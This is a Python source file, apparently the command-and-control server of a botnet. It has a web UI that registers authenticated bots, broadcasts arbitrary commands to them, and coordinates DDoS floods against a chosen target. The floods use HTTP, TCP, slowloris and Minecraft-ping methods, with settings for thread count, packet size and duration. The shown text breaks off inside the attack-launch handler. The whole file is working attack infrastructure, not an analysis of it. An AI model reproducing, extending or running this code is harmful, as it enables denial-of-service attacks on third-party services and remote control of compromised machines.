#!/usr/bin/env python3
# server.py — C2 + UI + HMAC на весь трафик. v2.19
# usage: python3 server.py <c2_port> <ui_port>

import base64
import hashlib
import hmac
import html
import json
import os
import socket
import sys
import threading
import time
import uuid
from collections import OrderedDict
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ---- .env autoload ----
def _load_dotenv(path=".env"):
    if not os.path.exists(path):
        return
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                k = k.strip()
                v = v.strip().strip("'\"")
                if k and k not in os.environ:
                    os.environ[k] = v
    except OSError:
        pass

_load_dotenv()
# ----------------------

UI_PASSWORD = os.environ.get("C2_UI_PASSWORD", "")
UI_SECRET   = os.environ.get("C2_UI_SECRET", "")
if not UI_SECRET:
    UI_SECRET = "change-me-" + uuid.uuid4().hex
    print("[!] C2_UI_SECRET not set — tokens will be invalidated on restart")
UI_RATE_WIN = 300
UI_RATE_MAX = 5
ATTACK_DELAY_MS = 3000
AUDIO_URL = os.environ.get("C2_AUDIO_URL", "https://media.tenor.com/UcpzfXzOr0MAAAAM/miku-miku-beam-hatsune-miku.gif")
QUIET_PSK = os.environ.get("C2_QUIET_PSK", "") == "1"

_psk_hex = os.environ.get("C2_PSK", "")
if _psk_hex and len(_psk_hex) == 64:
    try: PSK = bytes.fromhex(_psk_hex)
    except ValueError: PSK = os.urandom(32)
else: PSK = os.urandom(32)

_psk_prev_hex = os.environ.get("C2_PSK_PREV", "")
PSK_PREV = None
if _psk_prev_hex and len(_psk_prev_hex) == 64:
    try: PSK_PREV = bytes.fromhex(_psk_prev_hex)
    except ValueError: PSK_PREV = None

HMAC_WINDOW = 300.0
NONCE_TTL   = 600.0
NONCE_KEEP  = 4096
CMD_MAX     = 4096

MAX_BOTS = 128
BUF = 65536
HELLO_TIMEOUT = 10.0
HELLO_MAX_LEN = 65536
WS_AUTH_TIMEOUT = 10.0
PING_TIMEOUT = 45.0
REAPER_INTERVAL = 5.0
ACK_TIMEOUT = 10.0
MAX_RETRIES = 3
INFLIGHT_TTL_DONE = 300.0
INFLIGHT_TTL_LOST = 60.0
DEAD_BOT_TTL = 300.0
LAN_CACHE_TTL = 60.0
ATTACK_GRACE_SEC = 5.0
ORPHAN_GRACE_SEC = 30.0
STATS_LOG_INTERVAL = 10.0

DDOS_LIMITS = {
    "threads_max": 64, "pktsize_max": 1400, "duration_max": 3600, "delay_ms_max": 10000,
    "methods": ["http_flood","http_burst","http_bypass","http_slowloris",
                "tcp_flood","tcp_burst","tcp_slowloris","minecraft_ping"],
}

bots = {}
in_flight = {}
lock = threading.Lock()
send_lock = threading.Lock()
attack_lock = threading.Lock()
attack_gen = 0
BOTS_FILE = os.environ.get("C2_BOTS_FILE", "bots.json")
_bots_dirty = False

seen_frame_nonces = {}
seen_hello_nonces = {}

_lan_cache = {"ts": 0.0, "ips": []}
_lan_lock = threading.Lock()

ui_state = {
    "attack_running": False, "attack_start_ts": 0, "attack_duration": 0,
    "total_packets": 0, "last_pps_window": [], "bot_pps": {},
    "had_attack": False, "last_finished_reason": "",
    "attack_target": "", "attack_method": "",
    "_last_stats_log": {},
}
ui_lock = threading.Lock()
log_buf = []
log_lock = threading.Lock()
rate_state = {}
rate_lock = threading.Lock()
ws_clients = []
ws_lock = threading.Lock()


class C2HTTPServer(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True
    
    def shutdown_request(self, request):
        if getattr(request, "_ws_keep", False):
            return
        super().shutdown_request(request)
        
    def finish(self):
        if getattr(self.connection, "_ws_keep", False):
            return
        super().finish()


def _save_bots():
    global _bots_dirty
    with lock:
        data = []
        for bid, b in bots.items():
            data.append({
                "id": bid, "ip": b.get("ip",""), "host": b.get("host","?"),
                "os": b.get("os","?"), "arch": b.get("arch","?"),
                "last_seen": b.get("last_seen",0), "alive": b.get("alive",False),
            })
        _bots_dirty = False
    try:
        with open(BOTS_FILE, "w") as f:
            json.dump(data, f)
    except OSError:
        pass

def _load_bots():
    try:
        with open(BOTS_FILE, "r") as f:
            data = json.load(f)
        now = time.time()
        with lock:
            for e in data:
                bid = e.get("id")
                if not bid: continue
                bots[bid] = {
                    "sock": None, "ip": e.get("ip",""), "alive": False,
                    "host": e.get("host","?"), "os": e.get("os","?"),
                    "arch": e.get("arch","?"), "last_seen": e.get("last_seen",0),
                    "seq": 0, "closed_at": now,  # <--- 2.4: теперь не удалится сразу
                }
        print(f"[*] Loaded {len(data)} known bots from {BOTS_FILE}")
    except (OSError, json.JSONDecodeError):
        pass


def _hmac_hex(b, key=None): return hmac.new(key or PSK, b, hashlib.sha256).hexdigest()

def _payload_for_hash(typ, cmd, data):
    if typ in ("CMD", "CMD_ACK", "CMD_RESULT"): return cmd or ""
    if typ == "OUT": return data or ""
    return ""

def _hash8(s): return hashlib.sha256(s.encode()).hexdigest()[:8]

def _sign_frame_key(key, bid, ts, nonce, typ, cid, cmd="", data=""):
    ph = _hash8(_payload_for_hash(typ, cmd, data))
    msg = f"{bid}|{ts}|{nonce}|{typ}|{cid or ''}|{ph}".encode()
    return _hmac_hex(msg, key)

def _sign_frame(bid, ts, nonce, typ, cid, cmd="", data=""):
    return _sign_frame_key(PSK, bid, ts, nonce, typ, cid, cmd, data)

def _nonce_ok(cache, bid, nonce, ts):
    if not nonce or len(nonce) != 16: return False
    now = time.time()
    with lock:
        dq = cache.get(bid)
        if dq is None:
            dq = OrderedDict(); cache[bid] = dq
        while dq:
            first_t = next(iter(dq.values()))
            if now - first_t < NONCE_TTL: break
            dq.popitem(last=False)
        if nonce in dq: return False
        dq[nonce] = now
        while len(dq) > NONCE_KEEP:
            dq.popitem(last=False)
        return True

def _verify_frame(bid, msg):
    try: ts_i = int(msg.get("ts"))
    except (TypeError, ValueError): return False, "bad ts"
    now = time.time()
    if ts_i - now > HMAC_WINDOW: return False, "ts future"
    if now - ts_i > HMAC_WINDOW: return False, "ts past"
    sig = msg.get("hmac", ""); nonce = msg.get("nonce", "")
    typ = msg.get("type", ""); cid = msg.get("cmd_id", "")
    cmd = msg.get("cmd", "") or ""; data = msg.get("data", "") or ""
    if not isinstance(sig, str) or len(sig) != 64: return False, "sig len"
    expect = _sign_frame(bid, ts_i, nonce, typ, cid, cmd, data)
    if not hmac.compare_digest(expect, sig.lower()):
        if PSK_PREV:
            expect2 = _sign_frame_key(PSK_PREV, bid, ts_i, nonce, typ, cid, cmd, data)
            if not hmac.compare_digest(expect2, sig.lower()):
                return False, "hmac"
        else:
            return False, "hmac"
    if not _nonce_ok(seen_frame_nonces, bid, nonce, ts_i): return False, "replay"
    return True, ""


def _sign_token(ts):
    msg = f"{ts}".encode()
    return f"{ts}.{hmac.new(UI_SECRET.encode(), msg, hashlib.sha256).hexdigest()}"

def _verify_token(tok):
    try:
        ts_s, mac = tok.split(".", 1); ts = int(ts_s)
    except Exception: return False
    if abs(time.time() - ts) > 3600: return False
    expect = hmac.new(UI_SECRET.encode(), ts_s.encode(), hashlib.sha256).hexdigest()
    return hmac.compare_digest(expect, mac)

def _rate_ok(ip):
    now = time.time()
    with rate_lock:
        arr = [t for t in rate_state.get(ip, []) if now - t < UI_RATE_WIN]
        if len(arr) >= UI_RATE_MAX:
            rate_state[ip] = arr; return False
        arr.append(now); rate_state[ip] = arr; return True


def _bots_alive_count():
    with lock:
        return sum(1 for b in bots.values() if b.get("alive") and b.get("sock"))

def _lan_ips():
    now = time.time()
    with _lan_lock:
        if now - _lan_cache["ts"] < LAN_CACHE_TTL:
            return list(_lan_cache["ips"])
    out = []
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None, socket.AF_INET):
            ip = info[4][0]
            if not ip.startswith("127.") and ip not in out: out.append(ip)
    except OSError: pass
    with _lan_lock:
        _lan_cache["ts"] = now; _lan_cache["ips"] = out
    return out

def _escape_js(s):
    return json.dumps(s).replace("</", "<\\/")

def _escape_html_text(s):
    return html.escape(s, quote=True)


def ui_log(msg, kind="info"):
    with log_lock:
        log_buf.append({"msg": msg, "kind": kind, "ts": time.time()})
        if len(log_buf) > 200: del log_buf[:100]
    ui_ws_broadcast({"type": "log", "entry": {"msg": msg, "kind": kind}})


WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

def recv_exact(conn, n):
    buf = b""
    while len(buf) < n:
        try: chunk = conn.recv(n - len(buf))
        except OSError: return None
        if not chunk: return None
        buf += chunk
    return buf

def ws_send_locked(entry, obj):
    data = json.dumps(obj, ensure_ascii=False).encode()
    hdr = bytearray([0x81]); n = len(data)
    if n < 126: hdr.append(n)
    elif n < 65536: hdr.append(126); hdr += n.to_bytes(2, "big")
    else: hdr.append(127); hdr += n.to_bytes(8, "big")
    with entry["send_lock"]:
        try:
            entry["conn"].sendall(bytes(hdr) + data); return True
        except OSError: return False

def ws_recv_frame(conn, deadline=None):
    if deadline is not None:
        left = deadline - time.time()
        if left <= 0: return None
        try: conn.settimeout(max(0.1, min(left, 1.0)))
        except OSError: return None
    h = recv_exact(conn, 2)
    if h is None: return None
    b1, b2 = h[0], h[1]
    op = b1 & 0x0F; masked = b2 & 0x80; ln = b2 & 0x7F
    if ln == 126:
        ext = recv_exact(conn, 2); ln = int.from_bytes(ext, "big") if ext else 0
    elif ln == 127:
        ext = recv_exact(conn, 8); ln = int.from_bytes(ext, "big") if ext else 0
    mask = recv_exact(conn, 4) if masked else b""
    if masked and mask is None: return None
    if ln > 65536: return None
    payload = recv_exact(conn, ln) if ln else b""
    if payload is None: return None
    if masked: payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    return op, payload

def _ws_init_payload():
    with ui_lock:
        running = ui_state["attack_running"]
        total = ui_state["total_packets"]
        last_reason = "" if running else ui_state.get("last_finished_reason", "")
        target = ui_state.get("attack_target", "")
        method = ui_state.get("attack_method", "")
    with log_lock:
        logs = list(log_buf[-10:])
    return {
        "type":"init",
        "active_bots": _bots_alive_count(),
        "total_packets": total,
        "log": logs,
        "lan_ips": _lan_ips(),
        "attack_running": running,
        "last_finished_reason": last_reason,
        "attack_target": target,
        "attack_method": method,
    }

def ws_client_loop(entry):
    conn = entry["conn"]
    if not UI_PASSWORD:
        entry["authed"] = True
        try: conn.settimeout(None)
        except OSError: pass
        if not ws_send_locked(entry, _ws_init_payload()): _ws_remove(entry); return
    else:
        deadline = time.time() + WS_AUTH_TIMEOUT
        while time.time() < deadline and not entry["authed"]:
            fr = ws_recv_frame(conn, deadline)
            if fr is None: break
            op, pl = fr
            if op == 0x8: break
            if op == 0x9:
                try:
                    with entry["send_lock"]: conn.sendall(bytes([0x8A, len(pl)]) + pl)
                except OSError: break
                continue
            if op == 0x1:
                try: m = json.loads(pl.decode(errors="replace"))
                except Exception: continue
                if m.get("type") == "auth" and _verify_token(m.get("token","")):
                    entry["authed"] = True
                break
        if not entry["authed"]: _ws_remove(entry); return
        try: conn.settimeout(None)
        except OSError: pass
        if not ws_send_locked(entry, _ws_init_payload()): _ws_remove(entry); return
    while True:
        fr = ws_recv_frame(conn)
        if fr is None: break
        op, pl = fr
        if op == 0x8: break
        if op == 0x9:
            try:
                with entry["send_lock"]: conn.sendall(bytes([0x8A, len(pl)]) + pl)
            except OSError: break
    _ws_remove(entry)

def _ws_remove(entry):
    with ws_lock:
        try: ws_clients.remove(entry)
        except ValueError: pass
    try: setattr(entry["conn"], "_ws_keep", False)
    except Exception: pass
    try:
        entry["conn"].shutdown(socket.SHUT_RDWR)
    except OSError: pass
    try: entry["conn"].close()
    except OSError: pass

def ui_ws_broadcast(obj, only_authed=True):
    with ws_lock:
        targets = [c for c in ws_clients if (c["authed"] or not only_authed)]
    dead = []
    for c in targets:
        if not ws_send_locked(c, obj): dead.append(c)
    for d in dead: _ws_remove(d)

def ws_stats_loop():
    while True:
        time.sleep(1); now = time.time()
        with ui_lock:
            win = [(ts, p) for (ts, p) in ui_state["last_pps_window"] if now - ts < 2.0]
            ui_state["last_pps_window"] = win
            pps = int(sum(p for _, p in win) / 2.0) if win else 0
            total = ui_state["total_packets"]
            prog = 0.0
            if ui_state["attack_running"] and ui_state["attack_duration"] > 0:
                elapsed = now - ui_state["attack_start_ts"]
                prog = min(1.0, elapsed / ui_state["attack_duration"])
            payload = {"type":"stats","pps":pps,"total":total,"progress":prog}
        ui_ws_broadcast(payload)
        ui_ws_broadcast({"type":"bots","count": _bots_alive_count()})


def _send_json(sock, obj):
    try:
        with send_lock: sock.sendall((json.dumps(obj, ensure_ascii=False) + "\n").encode())
        return True
    except OSError: return False

def _close_bot(bid, sock, reason=""):
    global _bots_dirty
    with lock:
        b = bots.get(bid)
        if not b or b.get("sock") is not sock or not b.get("alive"): return
        b["alive"] = False
        b["closed_at"] = time.time()
        try: b["sock"].shutdown(socket.SHUT_RDWR)
        except OSError: pass
        try: b["sock"].close()
        except OSError: pass
        for cid, rec in in_flight.items():
            if rec["bot_id"] == bid and rec["state"] in ("SENT","ACKED"):
                if rec.get("kind") == "ddos_start":
                    rec["state"] = "ORPHANED"
                    rec["orphaned_at"] = time.time()
                else:
                    rec["state"] = "LOST"
        _bots_dirty = True
    ui_log(f"Бот {bid} отключён: {reason}", "warn")

def _read_hello(conn):
    t0 = time.time(); buf = b""
    while time.time() - t0 < HELLO_TIMEOUT:
        try: data = conn.recv(BUF)
        except socket.timeout: continue
        except OSError: return None, b""
        if not data: return None, b""
        buf += data
        if len(buf) > HELLO_MAX_LEN: return None, b""
        if b"\n" in buf:
            line, tail = buf.split(b"\n", 1)
            try: return json.loads(line.decode(errors="replace")), tail
            except json.JSONDecodeError: return None, b""
    return None, b""

def _recv_lines(sock, initial=b""):
    buf = initial
    while True:
        while b"\n" in buf:
            line, buf = buf.split(b"\n", 1)
            yield line.decode(errors="replace")
        try: data = sock.recv(BUF)
        except socket.timeout: continue
        except OSError: return
        if not data: return
        buf += data

def _sign_and_send(sock, bid, obj):
    typ = obj.get("type",""); cid = obj.get("cmd_id","")
    cmd = obj.get("cmd","") or ""; data = obj.get("data","") or ""
    obj["ts"] = int(time.time())
    obj["nonce"] = uuid.uuid4().hex[:16]
    obj["hmac"] = _sign_frame(bid, obj["ts"], obj["nonce"], typ, cid, cmd, data)
    return _send_json(sock, obj)

def bot_reader(bid, sock, ip, initial=b""):
    for raw in _recv_lines(sock, initial):
        raw = raw.strip()
        if not raw: continue
        try: msg = json.loads(raw)
        except json.JSONDecodeError:
            ui_log(f"{bid} bad JSON: {raw[:60]}", "err"); continue
        ok, reason = _verify_frame(bid, msg)
        if not ok:
            ui_log(f"{bid} HMAC fail: {reason}", "err")
            _close_bot(bid, sock, f"hmac: {reason}")
            return
        t = msg.get("type")
        with lock:
            b = bots.get(bid)
            if b and b.get("sock") is sock: b["last_seen"] = time.time()

        if t == "OUT":
            cid = msg.get("cmd_id","?"); stream = msg.get("stream","stdout")
            data = msg.get("data","")
            if stream == "stats": _handle_ddos_stats(bid, data)
            elif data:
                prefix = "E" if stream == "stderr" else " "
                ui_log(f"[{cid[:8]}{prefix}] {data.rstrip()}", "info" if stream=="stdout" else "warn")

        elif t == "CMD_ACK":
            cid = msg.get("cmd_id")
            with lock:
                rec = in_flight.get(cid)
                if rec and rec["bot_id"] == bid and rec["state"] in ("SENT","ORPHANED"):
                    rec["state"] = "ACKED"

        elif t == "CMD_RESULT":
            cid = msg.get("cmd_id"); code = msg.get("code"); timed = msg.get("timed_out",0)
            with lock:
                rec = in_flight.get(cid)
                if rec and rec["bot_id"] == bid:
                    already_done = rec["state"] == "DONE"
                    rec["state"] = "DONE"; rec["done_at"] = time.time()
                    kind = rec.get("kind")
                else:
                    kind = None; already_done = False
            if already_done:
                continue
            if kind == "ddos_start":
                if code is not None and code < 0:
                    ui_log(f"ddos_start от {bid} отвергнут (code={code})", "err")
                else:
                    ui_log(f"DDoS finished от {bid} code={code}", "ok")
                _check_attack_finished()
            elif kind == "ddos_stop":
                with ui_lock:
                    still_running = ui_state["attack_running"]
                if still_running:
                    _check_attack_finished()
            else:
                marker = " TIMEOUT" if timed else ""
                ui_log(f"[{cid[:8]}] done {bid} exit={code}{marker}", "ok" if code==0 else "warn")

        elif t == "PING":
            _sign_and_send(sock, bid, {"type":"PONG","id":bid})

    _close_bot(bid, sock, "peer closed")

def _handle_ddos_stats(bid, data):
    try:
        parts = dict(p.split("=",1) for p in data.strip().split())
        pps = int(parts.get("pps",0)); tot = int(parts.get("total",0))
    except Exception: return
    now = time.time()
    should_log = False
    with ui_lock:
        prev = ui_state["bot_pps"].get(bid,{}).get("total",0)
        delta = max(0, tot - prev)
        ui_state["bot_pps"][bid] = {"pps": pps, "total": tot, "last": now}
        ui_state["total_packets"] += delta
        ui_state["last_pps_window"].append((now, pps))
        if len(ui_state["last_pps_window"]) > 60: ui_state["last_pps_window"].pop(0)
        target = ui_state.get("attack_target","?")
        last_log = ui_state["_last_stats_log"].get(bid, 0)
        if delta > 0 and now - last_log >= STATS_LOG_INTERVAL:
            ui_state["_last_stats_log"][bid] = now
            should_log = True
    if should_log:
        ip = "?"
        with lock:
            b = bots.get(bid)
            if b: ip = b.get("ip","?")
        ui_log(f"Miku Miku Beam from {ip} to {target}", "info")

def _check_attack_finished(reason=None):
    with lock:
        now = time.time()
        active = False
        for rec in in_flight.values():
            if rec.get("kind") == "ddos_start":
                if rec["state"] in ("SENT","ACKED"):
                    active = True; break
                elif rec["state"] == "ORPHANED":
                    if now - rec.get("orphaned_at", 0) < ORPHAN_GRACE_SEC:
                        active = True; break

    with ui_lock:
        was = ui_state["attack_running"]
        if not active:
            ui_state["attack_running"] = False
            ui_state["had_attack"] = False
            if reason: ui_state["last_finished_reason"] = reason

    if not active and was:
        with lock:
            for rec in in_flight.values():
                if rec.get("kind") == "ddos_start" and rec["state"] == "ORPHANED":
                    rec["state"] = "DONE"
                    rec["done_at"] = time.time()
        payload = {"type":"finished"}
        if reason: payload["reason"] = reason
        ui_ws_broadcast(payload)
        ui_log(f"Атака завершена{' ('+reason+')' if reason else ''}", "ok")

def accept_loop(srv):
    global _bots_dirty
    while True:
        try: conn, addr = srv.accept()
        except OSError: break
        ip = addr[0]; conn.settimeout(1.0)
        try: hello, tail = _read_hello(conn)
        except Exception: hello, tail = None, b""
        if hello is None or hello.get("type") != "HELLO" or not hello.get("id"):
            try: conn.close()
            except OSError: pass
            continue
        bid = hello["id"]
        try: ts_i = int(hello.get("ts"))
        except (TypeError, ValueError):
            try: conn.close()
            except OSError: pass
            continue
        now = time.time()
        if ts_i - now > HMAC_WINDOW or now - ts_i > HMAC_WINDOW:
            ui_log(f"[!] HELLO {ip}: ts", "err")
            try: conn.close()
            except OSError: pass
            continue
        nonce = hello.get("nonce","")
        expect = hmac.new(PSK, f"{bid}|{ts_i}|{nonce}".encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(expect, (hello.get("hmac") or "").lower()):
            if PSK_PREV:
                expect2 = hmac.new(PSK_PREV, f"{bid}|{ts_i}|{nonce}".encode(), hashlib.sha256).hexdigest()
                if not hmac.compare_digest(expect2, (hello.get("hmac") or "").lower()):
                    ui_log(f"[!] HELLO {ip}: hmac", "err")
                    try: conn.close()
                    except OSError: pass
                    continue
            else:
                ui_log(f"[!] HELLO {ip}: hmac", "err")
                try: conn.close()
                except OSError: pass
                continue
        if not _nonce_ok(seen_hello_nonces, bid, nonce, ts_i):
            ui_log(f"[!] HELLO {ip}: replay", "err")
            try: conn.close()
            except OSError: pass
            continue

        with attack_lock:
            current_gen = attack_gen

        with lock:
            if sum(1 for b in bots.values() if b.get("alive") and b.get("sock")) >= MAX_BOTS:
                try: conn.close()
                except OSError: pass
                continue
            reconnected = bid in bots and bots[bid].get("alive")
            old_sock = None
            if reconnected:
                old_sock = bots[bid].get("sock")
            
            bots[bid] = {"sock": conn, "ip": ip, "alive": True,
                "host": hello.get("host","?"), "os": hello.get("os","?"),
                "arch": hello.get("arch","?"), "last_seen": time.time(), "seq": 0}
            
            if old_sock:
                try: old_sock.shutdown(socket.SHUT_RDWR)
                except OSError: pass
                try: old_sock.close()
                except OSError: pass

            if attack_gen == current_gen:
                for cid, rec in in_flight.items():
                    if rec["bot_id"] == bid and rec["state"] == "ORPHANED":
                        rec["state"] = "SENT"; rec["sent_at"] = time.time()
                        rec["retries"] = 0
            _bots_dirty = True
        conn.settimeout(None)
        ui_log(f"Бот {bid} @ {ip} [{'reconnect' if reconnected else 'new'}]", "ok")
        threading.Thread(target=bot_reader, args=(bid, conn, ip, tail), daemon=True).start()

def broadcast_cmd(cmd, kind=None, gen=None):
    if len(cmd) > CMD_MAX:
        ui_log(f"cmd too long ({len(cmd)}>{CMD_MAX}), truncating", "warn")
        cmd = cmd[:CMD_MAX]
    with lock:
        targets = []
        for bid, b in bots.items():
            if not b.get("alive") or not b.get("sock"): continue
            b["seq"] += 1; cid = uuid.uuid4().hex[:16]
            in_flight[cid] = {"bot_id": bid, "cmd": cmd, "sent_at": time.time(),
                              "state": "SENT", "retries": 0, "kind": kind}
            targets.append((bid, b["sock"], b["seq"], cid))
    dead = []
    sent = 0
    # 2.5: O(1) отмена вместо O(n^2) targets.index
    aborted = False
    for i, (bid, sock, seq, cid) in enumerate(targets):
        if gen is not None and not aborted:
            with attack_lock:
                if attack_gen != gen:
                    aborted = True
                    with lock:
                        for _, _, _, c2 in targets[i:]:
                            rec = in_flight.get(c2)
                            if rec and rec["state"] == "SENT":
                                rec["state"] = "LOST"
                    break
        obj = {"type":"CMD","id":bid,"cmd_id":cid,"seq":seq,"cmd":cmd}
        if not _sign_and_send(sock, bid, obj):
            dead.append((bid, cid, sock))
        else:
            sent += 1
    for bid, cid, sock in dead:
        with lock:
            rec = in_flight.get(cid)
            if rec:
                if rec.get("kind") == "ddos_start":
                    rec["state"] = "ORPHANED"
                    rec["orphaned_at"] = time.time()
                else:
                    rec["state"] = "LOST"
        _close_bot(bid, sock, "send failed")
    # 2.2: возвращаем 0, если отменили
    if aborted:
        return 0
    return sent

def list_bots():
    with lock:
        alive = [(bid, b) for bid, b in bots.items() if b.get("alive") and b.get("sock")]
        pending = [(cid, r) for cid, r in in_flight.items()
                   if r["state"] in ("SENT","ACKED","ORPHANED")]
    print(f"\n--- Боты ({len(alive)}) ---")
    for bid, b in alive: print(f"  {bid}  {b['ip']}  {b['os']}/{b['arch']}  host={b['host']}")
    print(f"--- Pending ({len(pending)}) ---")
    for cid, r in pending: print(f"  {cid[:8]}  {r['bot_id']}  {r['state']}  retries={r['retries']}")
    print("-----------------")

def reaper():
    global _bots_dirty
    while True:
        time.sleep(REAPER_INTERVAL); now = time.time()
        with lock:
            stale = [(bid, b["sock"]) for bid, b in bots.items()
                     if b.get("alive") and b.get("sock") and now - b.get("last_seen",0) > PING_TIMEOUT]
            dead_ttl = [bid for bid, b in bots.items()
                        if not b.get("alive") and now - b.get("closed_at",0) > DEAD_BOT_TTL]
        with ui_lock:
            attack_active = ui_state["attack_running"]
        for bid, sock in stale: _close_bot(bid, sock, f"timeout {PING_TIMEOUT}s")
        
        if attack_active:
            alive_count = _bots_alive_count()
            if alive_count == 0:
                with ui_lock:
                    ui_state["attack_running"] = False
                    ui_state["had_attack"] = False
                ui_ws_broadcast({"type": "finished", "reason": "all bots lost"})
                ui_log("Атака завершена: все боты потеряны", "err")

        for bid in dead_ttl:
            with lock:
                b = bots.get(bid)
                if not b or b.get("alive"): continue
                has_orphan = any(rec["bot_id"] == bid and rec["state"] == "ORPHANED"
                                 for rec in in_flight.values())
                if has_orphan and attack_active: continue
                bots.pop(bid, None)
                seen_frame_nonces.pop(bid, None)
                seen_hello_nonces.pop(bid, None)
                _bots_dirty = True
        with lock:
            for cid in list(in_flight.keys()):
                rec = in_flight[cid]
                if rec["state"] == "DONE" and now - rec.get("done_at",0) > INFLIGHT_TTL_DONE:
                    del in_flight[cid]
                elif rec["state"] == "LOST" and now - rec.get("sent_at",0) > INFLIGHT_TTL_LOST:
                    del in_flight[cid]
                elif rec["state"] == "ORPHANED" and now - rec.get("orphaned_at",0) > INFLIGHT_TTL_LOST * 5:
                    del in_flight[cid]
            resend = []
            for cid, rec in in_flight.items():
                if rec["state"] != "SENT" or now - rec["sent_at"] < ACK_TIMEOUT: continue
                if rec["retries"] >= MAX_RETRIES:
                    if rec.get("kind") == "ddos_start":
                        rec["state"] = "ORPHANED"
                        rec["orphaned_at"] = now
                    else:
                        rec["state"] = "LOST"
                    continue
                b = bots.get(rec["bot_id"])
                if not b or not b.get("alive") or not b.get("sock"):
                    if rec.get("kind") == "ddos_start":
                        rec["state"] = "ORPHANED"
                        rec["orphaned_at"] = now
                    else:
                        rec["state"] = "LOST"
                    continue
                rec["retries"] += 1; rec["sent_at"] = now
                resend.append((rec["bot_id"], b["sock"], b["seq"], cid, rec["cmd"]))
        for bid, sock, seq, cid, cmd in resend:
            obj = {"type":"CMD","id":bid,"cmd_id":cid,"seq":seq,"cmd":cmd}
            _sign_and_send(sock, bid, obj)
        with ui_lock:
            can_check = (not ui_state["attack_running"]
                         or time.time() - ui_state.get("attack_start_ts", 0) > ATTACK_GRACE_SEC)
        if can_check:
            _check_attack_finished()
        with lock:
            dirty = _bots_dirty
        if dirty:
            _save_bots()


class UIHandler(BaseHTTPRequestHandler):
    server_version = "C2UI/2.19"
    def log_message(self, fmt, *args): pass

    def _json(self, obj, code=200):
        body = json.dumps(obj, ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        try: self.wfile.write(body)
        except OSError: pass

    def _body_json(self):
        try: n = int(self.headers.get("Content-Length","0"))
        except ValueError: n = 0
        if n <= 0: return {}
        if n > 65536:
            self.close_connection = True; return {}
        try: return json.loads(self.rfile.read(n))
        except Exception: return {}

    def _authed(self):
        if not UI_PASSWORD: return True
        return _verify_token(self.headers.get("X-C2-Token",""))

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            html_body = (INDEX_HTML
                    .replace("__ATTACK_DELAY_MS__", str(ATTACK_DELAY_MS))
                    .replace("__AUDIO_URL__", _escape_js(AUDIO_URL)))
            body = html_body.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            try: self.wfile.write(body)
            except OSError: pass
            return
        if self.path == "/ws/ui": self._handle_ws(); return
        self.send_error(404)

    def do_POST(self):
        ip = self.client_address[0]
        if self.path == "/api/ui-config":
            self._json({"auth_required": bool(UI_PASSWORD)}); return
        if self.path == "/api/ui-token":
            if not _rate_ok(ip): self._json({"detail":"rate limited"}, 429); return
            body = self._body_json()
            if UI_PASSWORD:
                given = body.get("password","")
                if not isinstance(given, str) or not hmac.compare_digest(given, UI_PASSWORD):
                    self._json({"detail":"bad password"}, 401); return
            self._json({"token": _sign_token(int(time.time())) if UI_PASSWORD else ""}); return
        if self.path == "/api/ui-refresh":
            if not self._authed(): self._json({"detail":"unauthorized"}, 401); return
            self._json({"token": _sign_token(int(time.time())) if UI_PASSWORD else ""}); return
        if not self._authed(): self._json({"detail":"unauthorized"}, 401); return
        if self.path == "/api/attack/check":
            bots_alive = _bots_alive_count()
            with ui_lock: running = ui_state["attack_running"]
            if running: self._json({"ok": False, "reason": "attack already running", "bots": bots_alive})
            elif bots_alive == 0: self._json({"ok": False, "reason": "no alive bots", "bots": 0})
            else: self._json({"ok": True, "reason": "", "bots": bots_alive})
            return
        if self.path == "/api/attack": self._api_attack(); return
        if self.path == "/api/stop": self._api_stop(); return
        if self.path == "/api/exit":
            global attack_gen
            with attack_lock:
                attack_gen += 1
                with ui_lock:
                    ui_state["attack_running"] = False
                    ui_state["had_attack"] = False
            with lock:
                targets = [(bid, b["sock"], b["seq"]) for bid, b in bots.items()
                           if b.get("alive") and b.get("sock")]
                for bid, b in bots.items():
                    if b.get("alive") and b.get("sock"): b["seq"] += 1
            for bid, sock, seq in targets:
                cid = uuid.uuid4().hex[:16]
                obj = {"type":"CMD","id":bid,"cmd_id":cid,"seq":seq,"cmd":"exit"}
                _sign_and_send(sock, bid, obj)
            self._json({"ok": True}); return
        self.send_error(404)

    def _api_attack(self):
        global attack_gen
        with attack_lock:
            body = self._body_json()
            def _gi(k, d):
                v = body.get(k)
                if v is None: return d
                try: return int(v)
                except (TypeError, ValueError): return None
            try:
                target = (body.get("target") or "").strip(); method = body.get("method") or ""
            except Exception: self._json({"detail":"invalid field"}, 400); return
            pktsize = _gi("packet_size_kb", 64); duration = _gi("duration_sec", 60)
            delay_ms = _gi("packet_delay_ms", 0); threads = _gi("threads", 8)
            if None in (pktsize, duration, delay_ms, threads):
                self._json({"detail":"invalid numeric field"}, 400); return
            if method not in DDOS_LIMITS["methods"]: self._json({"detail": f"unsupported method {method}"}, 400); return
            if not target: self._json({"detail":"target required"}, 400); return
            if not (1 <= pktsize <= DDOS_LIMITS["pktsize_max"]): self._json({"detail":"pktsize"}, 400); return
            if not (5 <= duration <= DDOS_LIMITS["duration_max"]): self._json({"detail":"duration"}, 400); return
            if not (0 <= delay_ms <= DDOS_LIMITS["delay_ms_max"]): self._json({"detail":"delay_ms"}, 400); return
            if not (1 <= threads <= DDOS_LIMITS["threads_max"]): self._json({"detail":"threads"}, 400); return
            with ui_lock:
                if ui_state["attack_running"]:
                    self._json({"detail":"attack already running"}, 409); return
                ui_state["attack_running"] = True
                ui_state["attack_start_ts"] = time.time()
                ui_state["attack_duration"] = duration
                ui_state["total_packets"] = 0
                ui_state["bot_pps"] = {}
                ui_state["last_pps_window"] = []
                ui_state["had_attack"] = True
                ui_state["last_finished_reason"] = ""
                ui_state["attack_target"] = target
                ui_state["attack_method"] = method
